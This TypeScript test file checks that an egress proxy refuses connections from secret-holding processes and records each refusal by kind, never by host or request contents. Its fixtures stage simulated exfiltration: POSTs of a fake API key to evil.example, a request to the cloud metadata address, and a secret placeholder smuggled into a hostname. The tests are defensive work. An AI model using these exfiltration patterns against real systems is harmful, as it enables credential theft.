/**
 * egress-refusal-note — confidentiality plan 10 §11.8, "Refused
 * connections": when the proxy refuses a connection it tells the arbiter
 * which processes sent it and why, as a KIND (never the host, never a
 * request byte), so the model proxies can say the connection was refused.
 * Injected attribution and a mock arbiter (no /proc, no daemon).
 */

import { test } from "node:test";
import assert from "node:assert/strict";
import { request as httpRequest } from "node:http";
import { connect as netConnect } from "node:net";

import { NetProxy, destinationAuthority, type HttpForwarder } from "../../src/proxy.js";
import { ArbiterClientAdapter, MockArbiter } from "../../src/arbiter-client.js";
import { refusalKindOf } from "../../src/egress.js";

const noop = (): void => {};
const okForwarder: HttpForwarder = async () => ({ status: 200, headers: { "content-type": "text/plain" }, body: Buffer.from("ok") });

function postThroughProxy(port: number, targetUrl: string, body: string): Promise<number> {
  return new Promise((resolve, reject) => {
    const u = new URL(targetUrl);
    const r = httpRequest(
      { host: "127.0.0.1", port, method: "POST", path: targetUrl, headers: { host: u.host, "content-type": "text/plain", "content-length": Buffer.byteLength(body) } },
      (res) => { res.resume(); res.on("end", () => resolve(res.statusCode ?? 0)); },
    );
    r.on("error", reject);
    r.end(body);
  });
}

test("refusalKindOf: the gate's reasons map to the fixed kinds", () => {
  assert.equal(refusalKindOf("secret-tainted process (read .env) → evil.example is not a bound host → approval required (plan 10 §4.3)"), "tainted");
  assert.equal(refusalKindOf("the connection to evil.example could not be attributed to a process, and a process of this session holds a secret (.env) → approval required (plan 13 D6, fail-closed)"), "unattributed");
  assert.equal(refusalKindOf("egress withheld 1 symbol(s) → block (fail-closed)"), "symbol");
  assert.equal(refusalKindOf("arbiter unreachable: ECONNREFUSED → block (fail-closed)"), "fail-closed");
});

test("a holder of a secret refused at an unbound host: the refusal is recorded by process and kind, never the host; an allowed request records nothing", async () => {
  const arbiter = new MockArbiter({
    secretTaint: { "4242-555": { tainted: true, level: "no-model", files: ["/w/.env"], bindings: ["bound.example"] } },
  });
  const proxy = new NetProxy({
    arbiter, forwarder: okForwarder, log: noop, sessionId: "s-refusal",
    attributeHolders: () => [{ procKey: "4242-555", ancestors: ["4242-1"] }],
  });
  const port = await proxy.listen(0);
  try {
    assert.equal(await postThroughProxy(port, "http://evil.example/collect", "rows"), 403);
    assert.deepEqual(arbiter.egressRefusals, [{ procKeys: ["4242-555"], kind: "tainted", sessionKey: "s-refusal" }]);
    assert.ok(!JSON.stringify(arbiter.egressRefusals).includes("evil.example"), "never the host");
    assert.equal(await postThroughProxy(port, "http://bound.example/collect", "rows"), 200);
    assert.equal(arbiter.egressRefusals.length, 1, "an allowed request records nothing");
  } finally {
    await proxy.close();
  }
});

test("an unattributed connection (no holder) is refused, and reported as unattributed: no process, no host, no request byte", async () => {
  const arbiter = new MockArbiter({ sessionTaint: { tainted: true, level: "no-model", files: ["/w/.env"] } });
  const proxy = new NetProxy({ arbiter, forwarder: okForwarder, log: noop, sessionId: "s-refusal", attributeHolders: () => [] });
  const port = await proxy.listen(0);
  try {
    assert.equal(await postThroughProxy(port, "http://evil.example/collect", "API_KEY=sk-live-0123"), 403, "the refusal itself is unchanged");
    assert.deepEqual(arbiter.egressRefusals, [{ procKeys: [], kind: "unattributed", unattributed: true, sessionKey: "s-refusal" }]);
    const said = JSON.stringify(arbiter.egressRefusals);
    assert.ok(!said.includes("evil.example") && !said.includes("sk-live-0123"), "never the host, never a request byte");
  } finally {
    await proxy.close();
  }
});

test("an unattributed connection to an always-refused address: reported with that kind, flagged unattributed", async () => {
  const arbiter = new MockArbiter({});
  const proxy = new NetProxy({ arbiter, forwarder: okForwarder, log: noop, sessionId: "s-refusal", attributeHolders: () => [] });
  const port = await proxy.listen(0);
  try {
    assert.equal(await postThroughProxy(port, "http://169.254.169.254/latest/meta-data/", ""), 403);
    assert.deepEqual(arbiter.egressRefusals, [{ procKeys: [], kind: "blocked-destination", unattributed: true, sessionKey: "s-refusal" }]);
  } finally {
    await proxy.close();
  }
});

test("the production adapter forwards an unattributed report to the human client, and drops a holderless report without the flag", async () => {
  const seen: unknown[] = [];
  const human = { resolve: async () => null, recordEgressRefusal: async (a: unknown) => { seen.push(a); return { recorded: true }; }, close: noop };
  const adapter = new ArbiterClientAdapter({} as never, human);
  await adapter.recordEgressRefusal({ procKeys: [], kind: "unattributed", unattributed: true, sessionKey: "s" });
  await adapter.recordEgressRefusal({ procKeys: [], kind: "tainted", sessionKey: "s" });
  assert.deepEqual(seen, [{ procKeys: [], kind: "unattributed", unattributed: true, sessionKey: "s" }]);
});

/** A raw CONNECT through the proxy; resolves with what the proxy answered. */
function connectThroughProxy(port: number, target: string): Promise<string> {
  return new Promise((resolve, reject) => {
    const sock = netConnect(port, "127.0.0.1", () => sock.write(`CONNECT ${target} HTTP/1.1\r\nHost: ${target}\r\n\r\n`));
    let got = "";
    sock.on("data", (d) => { got += d.toString("utf8"); });
    sock.on("close", () => resolve(got));
    sock.on("error", reject);
  });
}

// Plan 10 §11.8, "A placeholder as the destination" (2026-10-17): the
// CONNECT whose target carries a $MDU placeholder is refused as before, and
// now noted like every other refusal, under a kind of its own.
const SYMBOL_HOST = "$MDU:api_key[ab12cd34]";

test("a CONNECT to a placeholder host: refused (403, no tunnel), noted for the holder as symbol-destination, never the host or the symbol", async () => {
  const arbiter = new MockArbiter({});
  const proxy = new NetProxy({
    arbiter, forwarder: okForwarder, log: noop, sessionId: "s-refusal",
    attributeHolders: () => [{ procKey: "4242-555", ancestors: ["4242-1"] }],
  });
  const port = await proxy.listen(0);
  try {
    const answer = await connectThroughProxy(port, `${SYMBOL_HOST}.evil.example:443`);
    assert.match(answer, /^HTTP\/1\.1 403/, answer);
    assert.deepEqual(arbiter.egressRefusals, [{ procKeys: ["4242-555"], kind: "symbol-destination", sessionKey: "s-refusal" }]);
    const said = JSON.stringify(arbiter.egressRefusals);
    assert.ok(!said.includes("evil.example") && !said.includes("$MDU") && !said.includes("ab12cd34"), "never the host, never the symbol");
  } finally {
    await proxy.close();
  }
});

test("a CONNECT to a placeholder host that no process holds: noted as unattributed symbol-destination", async () => {
  const arbiter = new MockArbiter({});
  const proxy = new NetProxy({ arbiter, forwarder: okForwarder, log: noop, sessionId: "s-refusal", attributeHolders: () => [] });
  const port = await proxy.listen(0);
  try {
    assert.match(await connectThroughProxy(port, `${SYMBOL_HOST}:443`), /^HTTP\/1\.1 403/);
    assert.deepEqual(arbiter.egressRefusals, [{ procKeys: [], kind: "symbol-destination", unattributed: true, sessionKey: "s-refusal" }]);
  } finally {
    await proxy.close();
  }
});

/** A raw plain-HTTP request through the proxy (no URL parse on our side:
 *  a placeholder host is no valid URL host); resolves with the answer. */
function rawRequestThroughProxy(port: number, requestLine: string, host: string): Promise<string> {
  return new Promise((resolve, reject) => {
    const sock = netConnect(port, "127.0.0.1", () => sock.write(`${requestLine}\r\nHost: ${host}\r\nContent-Length: 4\r\nConnection: close\r\n\r\nrows`));
    let got = "";
    sock.on("data", (d) => { got += d.toString("utf8"); });
    sock.on("close", () => resolve(got));
    sock.on("error", reject);
  });
}

test("plain HTTP to a placeholder host (the request line, or the Host header): refused 403, noted as symbol-destination; a placeholder password is not a destination", async () => {
  const arbiter = new MockArbiter({});
  const reached: string[] = [];
  const proxy = new NetProxy({
    arbiter, forwarder: async (r) => { reached.push(r.url); return { status: 200, headers: { "content-type": "text/plain" }, body: Buffer.from("ok") }; },
    log: noop, sessionId: "s-refusal",
    attributeHolders: () => [{ procKey: "4242-555", ancestors: ["4242-1"] }],
  });
  const port = await proxy.listen(0);
  try {
    const absolute = await rawRequestThroughProxy(port, `POST http://${SYMBOL_HOST}.evil.example/collect HTTP/1.1`, `${SYMBOL_HOST}.evil.example`);
    assert.match(absolute, /^HTTP\/1\.1 403/, absolute);
    const origin = await rawRequestThroughProxy(port, "POST /collect HTTP/1.1", SYMBOL_HOST);
    assert.match(origin, /^HTTP\/1\.1 403/, origin);
    assert.deepEqual(arbiter.egressRefusals, [
      { procKeys: ["4242-555"], kind: "symbol-destination", sessionKey: "s-refusal" },
      { procKeys: ["4242-555"], kind: "symbol-destination", sessionKey: "s-refusal" },
    ]);
    assert.ok(!JSON.stringify(arbiter.egressRefusals).includes("$MDU"), "never the symbol");
    assert.deepEqual(reached, [], "nothing forwarded");
    // A placeholder in the userinfo is a credential the gate judges, not a destination.
    await rawRequestThroughProxy(port, `GET http://user:${SYMBOL_HOST}@h.example/ HTTP/1.1`, "h.example");
    assert.ok(!arbiter.egressRefusals.slice(2).some((r) => r.kind === "symbol-destination"), JSON.stringify(arbiter.egressRefusals));
  } finally {
    await proxy.close();
  }
});

test("destinationAuthority: the host part as written, past any userinfo; else the Host header", () => {
  assert.equal(destinationAuthority("http://h.example:8080/p?q"), "h.example:8080");
  assert.equal(destinationAuthority(`http://${SYMBOL_HOST}.evil.example/c`), `${SYMBOL_HOST}.evil.example`);
  assert.equal(destinationAuthority(`http://u:${SYMBOL_HOST}@h.example/`), "h.example");
  assert.equal(destinationAuthority("/collect", SYMBOL_HOST), SYMBOL_HOST);
  assert.equal(destinationAuthority("/collect"), "");
});
